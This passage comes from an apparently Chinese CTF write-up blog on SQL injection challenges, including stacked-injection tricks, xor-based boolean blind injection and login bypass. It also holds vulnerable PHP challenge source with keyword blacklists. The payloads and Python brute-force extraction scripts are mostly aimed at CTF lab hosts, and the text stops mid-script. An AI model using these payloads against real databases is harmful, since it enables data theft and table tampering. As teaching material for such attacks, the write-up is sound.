class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysqli_multi_query()  函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。有这个函数即可想到利用堆叠注入</p><p>sql_mode 是一组mysql支持的基本语法及校验规则</p><p><strong>mysql中sql_mode值举例：</strong> </p><p><strong>STRICT_TRANS_TABLES：</strong> </p><blockquote><p>mysql存储引擎的概念<br>innodb存储引擎（oltp系统）<br>myisam存储引擎（非实时交易）<br>对于innodb存储引擎来说当设置sql_mode有该值是，当发现插入数据无法正常插入，会报错，并且回滚所有参数（加入一个插入操作往数据表中插入10行数据，但是在第五行数据不能插入，此时会终止插入操作并且会回滚插入成功的数据）<br>对于myisam存储引擎：当插入数据是第一行无法插入时，报错并且回滚插入数据当插入的数据不是第一行无法插入时，此时mysql数据库会将无法插入的值转换为近似值或者发生隐式类型转换，并且不会报错 </p></blockquote><p><strong>STRICT_ALL_TABLES：</strong> </p><blockquote><p>对于innodb存储引擎作用一致<br>对于myisam存储引擎：当插入不是第一行报错时，会将报错之前的数据保留，终止之后的插入操作 </p></blockquote><p><strong>NO_ENGINE_SUBSTITUTION：</strong> </p><blockquote><p>当存储引擎被禁止或者未解析时，当使用时会报错 </p></blockquote><p><strong>only_for_group_by：</strong> </p><blockquote><p>当select字句中出现的单独列没有出现在group by字句中，此时就会报错 </p></blockquote><p><strong>NO_AUTO_CREATE_USER:</strong> </p><blockquote><p>禁止创建密码为空的用户 </p></blockquote><p><strong>NO_ZERO_IN_DATE：</strong> </p><blockquote><p>在严格模式下，不允许日期和月份为零 </p></blockquote><p><strong>NO_ZERO_DATE：</strong> </p><blockquote><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告 </p></blockquote><p><strong>ERROR_FOR_DIVISION_BY_ZERO：</strong> </p><blockquote><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL </p></blockquote><p><strong>NO_AUTO_CREATE_USER：</strong> </p><blockquote><p>禁止GRANT语句创建密码为空的用户 </p></blockquote><p><strong>PIPES_AS_CONCAT：</strong> </p><blockquote><p>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似（本题要点） </p></blockquote><p><strong>ANSI_QUOTES：</strong> </p><blockquote><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p></blockquote><p>于是有注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</span><br></pre></td></tr></table></figure><p>拼合起来就是：</p><pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>此时的select 1||flag from Flag就等同于select 1 from Flag和select flag from Flag的拼合</p><p><img src="https://i.loli.net/2020/03/27/e6sQR1uwh3UA9v5.png" alt=""></p><p>另外还有一个解就是*的用法：</p><p>注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>拼合起来就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure><p>*为查询所有，此时的select *,1||flag from Flag就等同于select * from Flag</p><p><img src="https://i.loli.net/2020/03/27/xLgmrQAq4CXcp2G.png" alt=""></p><h3 id="2019强网杯—supersql"><a href="#2019强网杯—supersql" class="headerlink" title="2019强网杯—supersql"></a>2019强网杯—supersql</h3><p><strong>解题核心</strong>——————堆叠注入；详见大佬博客：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">SQL注入-堆叠注入</a></p><p>由题意，得知这应该是一个sql注入的题目，点进去界面如下：</p><p><img src="https://i.loli.net/2020/03/27/Tdw4xkpqRJPmFQy.png" alt=""></p><p>刚开始用SQLMap测试了一下，发现好像没啥用，于是按开F12</p><p><img src="https://i.loli.net/2020/03/27/DBHQpKrU6AjybXo.png" alt=""></p><p>嗯，确实，一个工具有啥灵魂O.O</p><p>测试单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/5WiljO9kLTRwdqv.png" alt=""></p><p>接着测试注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;--+</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/lDUIhJOMKngXdsa.png" alt=""></p><p>被过滤掉了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;#</span><br></pre></td></tr></table></figure><p>#有效</p><p>尝试注入sql查询等语句，提示被过滤</p><p><img src="https://i.loli.net/2020/03/27/2AlOtopcrP7UjBs.png" alt=""></p><p>于是就用到前面提到了堆叠注入</p><p>首先列出所有数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;#         显示如下</span><br></pre></td></tr></table></figure><img src="D:\Blog\source\_posts\SQL注入.assets\image-116.png" style="zoom:50%;" /><p>列出所有表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#         显示如下</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/Sb8T1CNKvhA4snR.png" style="zoom:50%;" /><p>列出表words中的所有列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from words;#         显示如下</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/pFizfkZX6QTS9mR.png" style="zoom:50%;" /><p>列出表1919810931114514中所有的列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#         显示如下</span><br></pre></td></tr></table></figure><p><strong>注意：字符串为表名操作时要加反引号！！！</strong></p><img src="https://i.loli.net/2020/03/27/kKmUczN6AZCnRwb.png" style="zoom:50%;" /><p>由展示的结果发现输入查询的结果是一个数字和一个字符串，是表words中的id和data结构，服务器是把inject的数值赋给id来查询表words中的数据</p><p>这题没有禁用rename和alter</p><p>可采用修改表结构的方法来得到flag，将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p><blockquote><p>rename用来修改表名</p><p>用法rename命令格式：rename table 原表名 to 新表名;</p></blockquote><blockquote><p>alter用来删除，添加或修改表字段</p><p>常用的语法格式如下：ALTER TABLE &lt;表名&gt; [修改选项]</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</span><br></pre></td></tr></table></figure><p>上段注入语句的意思是将表words的名字修改为words1，把包含flag表1919810931114514的名字改成words，这样就可以通过服务器查询表1919810931114514中的内容了，但是flag表中含有少一个id列，于是可以在表中添加一个后者将flag列改为id，上面用到的是改flag列名字为id的方法,下面给出添加id列的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; add &#96;id&#96; varchar(100);#</span><br></pre></td></tr></table></figure><p>最终得到flag：</p><p><img src="https://i.loli.net/2020/03/27/UoGTZ8HB9c7KlQ3.png" alt=""></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">Smi1e</a></p><p>界面：</p><img src="https://i.loli.net/2020/03/27/tQegj4JmCsGbTXp.png" alt="image-20200224095042456" style="zoom:50%;" /><p>FUZZ测试后发现</p><img src="https://i.loli.net/2020/03/27/7UIS3oMv6DWqsj8.png" alt="image-20200224100832694" style="zoom:80%;" /><p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/" target="_blank" rel="noopener">参考</a></p><p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p><p>Payload2：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p><p>于是写出盲注爆表脚本（Payload1）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com/index.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">        d = <span class="string">"1^(ascii(substr((select group_concat(table_name,'') from sys.x$schema_flattened_keys),&#123;&#125;,1))=&#123;&#125;)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>:d&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到两个列名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p><p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">参考</a>，如图</p><img src="https://i.loli.net/2020/03/27/sFLidjDgr5weSft.png" alt="image-20200224131013444" style="zoom: 80%;" /><p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p><img src="https://i.loli.net/2020/03/27/JIK9gluR1khN6zr.png" alt="image-20200224131643156" style="zoom:80%;" /><p>注：出题人这里还有一个坑，详见题目下方的链接</p><p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p><p>这里可以测试出有两个列，但是盲猜第一列的第一个是1可还行</p><p>Payload：<code>1^((select 1,concat(&#39;{}~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p><p>于是写出盲注爆字段脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com/index.php"</span></span><br><span class="line">str = (<span class="string">"-"</span> + string.digits + string.ascii_letters + string.punctuation).replace(<span class="string">"'"</span>,<span class="string">""</span>).replace(<span class="string">'"'</span>,<span class="string">''</span>).replace(<span class="string">"\\"</span>,<span class="string">""</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">        d = <span class="string">"1^((select 1,concat('&#123;&#125;~',CAST('0' AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span>.format(flag+j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>:d&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    flag = flag + j</span><br></pre></td></tr></table></figure><p>最终可以得到flag</p><h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>界面：</p><img src="https://i.loli.net/2020/03/27/9WpDyf1SxXoMCrH.png" alt="image-20200224213301224" style="zoom:80%;" /><p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p><p><img src="https://i.loli.net/2020/03/27/tuM3g2DS8hEQ1WL.png" alt="image-20200224213403716"></p><p>于是可以在登录界面进行布尔盲注</p><p>爆库Payload：<code>2&#39; or (select (mid((select database()),{},1)))=&#39;{}&#39;#</code></p><p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),{},1)))=&#39;{}&#39;#</code></p><p>爆列Payload：<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),{},1)))=&#39;{}&#39;#</code></p><p>爆字段Payload：<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),{},1)))=&#39;{}&#39;#</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com/"</span></span><br><span class="line">str = (<span class="string">"-"</span> + string.digits + string.ascii_letters + string.punctuation).replace(<span class="string">"'"</span>,<span class="string">""</span>).replace(<span class="string">'"'</span>,<span class="string">''</span>).replace(<span class="string">"\\"</span>,<span class="string">""</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">        d = <span class="string">"(This is Payload)"</span>.format(i,j)</span><br><span class="line">        <span class="comment">#print(d)</span></span><br><span class="line">        data = &#123;<span class="string">"lname"</span>:d , <span class="string">"lpass"</span>:<span class="string">'xxx'</span>&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        r.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'成功'</span> <span class="keyword">in</span> r.text.encode(<span class="string">'gbk'</span>).decode(r.apparent_encoding):</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p><h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><p><img src="https://i.loli.net/2020/03/27/t2nS8YpRmGTEsx7.png" alt="image-20200210212526994"></p><p>题目给出了flag在flag表和flag列中</p><p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p><p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>:d&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        print(r.status_code)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Error'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>网上这题的源码，可以参考参考</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser=<span class="string">'root'</span>;</span><br><span class="line">$dbpass=<span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>,<span class="string">'||'</span>,<span class="string">'#'</span>,<span class="string">'-'</span>,<span class="string">';'</span>,<span class="string">'&amp;'</span>,<span class="string">'+'</span>,<span class="string">'or'</span>,<span class="string">'and'</span>,<span class="string">'`'</span>,<span class="string">'"'</span>,<span class="string">'insert'</span>,<span class="string">'group'</span>,<span class="string">'limit'</span>,<span class="string">'update'</span>,<span class="string">'delete'</span>,<span class="string">'*'</span>,<span class="string">'into'</span>,<span class="string">'union'</span>,<span class="string">'load_file'</span>,<span class="string">'outfile'</span>,<span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($blackList <span class="keyword">as</span> $blackitem)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos($sql,$blackitem))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>,$dbuser,$dbpass);</span><br><span class="line"><span class="keyword">if</span>(!$db)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>,$db);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(safe($id))&#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($query)&#123;</span><br><span class="line">        $result = mysql_fetch_array($query);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($result)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="极客大挑战—FinalSQL"><a href="#极客大挑战—FinalSQL" class="headerlink" title="极客大挑战—FinalSQL"></a>极客大挑战—FinalSQL</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><img src="https://i.loli.net/2020/03/27/QCzTh2I31XL9nAy.png" style="zoom:33%;" /><p>在用户名和密码密码处尝试注入，发现绝大多数的字符都被过滤，于是找到另一个注入点（如下图），把注释删掉后在界面传参回车后观察URL的变化，传了一个id参数，故尝试在URL中的id处注入</p><img src="https://i.loli.net/2020/03/27/MK1eADvmQB6dsRu.png" style="zoom: 80%;" /><img src="https://i.loli.net/2020/03/27/86VglRkI7S45mvB.png" style="zoom:33%;" /><img src="https://i.loli.net/2020/03/27/gICeiPW8srHKhEd.png" style="zoom:33%;" /><img src="https://i.loli.net/2020/03/27/bcTrdxNesgBo1lG.png" style="zoom:33%;" /><p>后台过滤到限制字符的显示的界面（如下图）</p><img src="https://i.loli.net/2020/03/27/R4IgVByGQD1h6Pk.png" style="zoom:33%;" /><p>当注入上一题的查询数据库语句时，发现可以注入，显示以下界面，应该是后台把报错的界面给处理了，所以看不到数据库报错的界面</p><img src="https://i.loli.net/2020/03/27/yjbmJD4Ocn76fCA.png" style="zoom:33%;" /><p>进行异或注入测试：</p><img src="https://i.loli.net/2020/03/27/cZS7VApdoaqNXOY.png" style="zoom:33%;" /><img src="https://i.loli.net/2020/03/27/CHb6hqjxP7R8QuZ.png" style="zoom:33%;" /><img src="https://i.loli.net/2020/03/27/D1vCu2slx3QiVIM.png" style="zoom:33%;" /><img src="https://i.loli.net/2020/03/27/mKkaqdETW7U9I3Z.png" style="zoom:33%;" /><p>通过上面的测试发现，id=1^1的结果和id=0的结果是一样的，二当id=1^0的时候，界面就返回了当id=1的时候的界面，由此可以想到通过构造ASCII函数配合substr函数判断字符大小，当ASCII函数值等于（居然没过滤）后面的十进制时，显示id=0的时候的界面，具体脚本和判断方法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^(ascii(substr(("此处为sql语句"),变量i,1))=变量j)</span><br></pre></td></tr></table></figure><p>查库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek')),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/31rlIa5vfeoYkNF.png" alt=""></p><p>查表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span 